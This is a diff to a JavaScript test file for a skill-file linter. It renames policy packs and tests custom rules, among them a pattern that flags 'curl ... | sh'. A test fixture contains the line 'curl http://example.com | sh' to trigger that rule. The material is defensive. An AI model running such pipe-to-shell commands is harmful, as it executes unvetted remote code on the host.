@@ -21,7 +21,7 @@ test("config validation accepts valid custom policy rules", () => {
         pattern: "curl\\s+.*\\|\\s*sh",
         message: "Downloading and piping directly to shell is forbidden",
         severity: "error",
-        pack: "security"
+        pack: "custom-security"
       },
       {
         id: "warning-style",
@@ -30,13 +30,13 @@ test("config validation accepts valid custom policy rules", () => {
         severity: "warning"
       }
     ],
-    policy_packs: ["generic", "security"]
+    policy_packs: ["linter", "custom-security"]
   });
 
   const config = resolveRuntimeConfig({ configPath });
   assert.equal(config.issues.length, 0, JSON.stringify(config.issues));
   assert.equal(config.config.custom_policy_rules.length, 2);
-  assert.deepEqual(config.config.policy_packs, ["generic", "security"]);
+  assert.deepEqual(config.config.policy_packs, ["linter", "custom-security"]);
 });
 
 test("config validation rejects invalid custom policy formats", () => {
@@ -79,23 +79,23 @@ test("config validation rejects invalid custom policy formats", () => {
 
 test("linter runs custom policies when their pack is active", () => {
   const rules = [
-    { id: "no-curl-sh", pattern: "curl\\s+.*\\|\\s*sh", message: "Direct shell piping is forbidden", severity: "error", pack: "security" },
-    { id: "todo-warn", pattern: "todo:", message: "Avoid todo", severity: "warning", pack: "generic" }
+    { id: "no-curl-sh", pattern: "curl\\s+.*\\|\\s*sh", message: "Direct shell piping is forbidden", severity: "error", pack: "custom-security" },
+    { id: "todo-warn", pattern: "todo:", message: "Avoid todo", severity: "warning", pack: "linter" }
   ];
   const content = "---\nname: test-skill\ndescription: A test skill\n---\n\ntodo: fix this.\ncurl http://example.com | sh";
 
-  // Case 1: Only generic is active.
+  // Case 1: Only linter is active.
   let findings = lintSkillContent(content, {
-    policyPacks: ["generic"],
+    policyPacks: ["linter"],
     customPolicyRules: rules
   });
   assert.equal(findings.length, 1);
   assert.equal(findings[0].code, "todo-warn");
   assert.equal(findings[0].severity, "warning");
 
-  // Case 2: Both generic and security active.
+  // Case 2: Both linter and custom-security active.
   findings = lintSkillContent(content, {
-    policyPacks: ["generic", "security"],
+    policyPacks: ["linter", "custom-security"],
     customPolicyRules: rules
   });
   assert.equal(findings.length, 2);
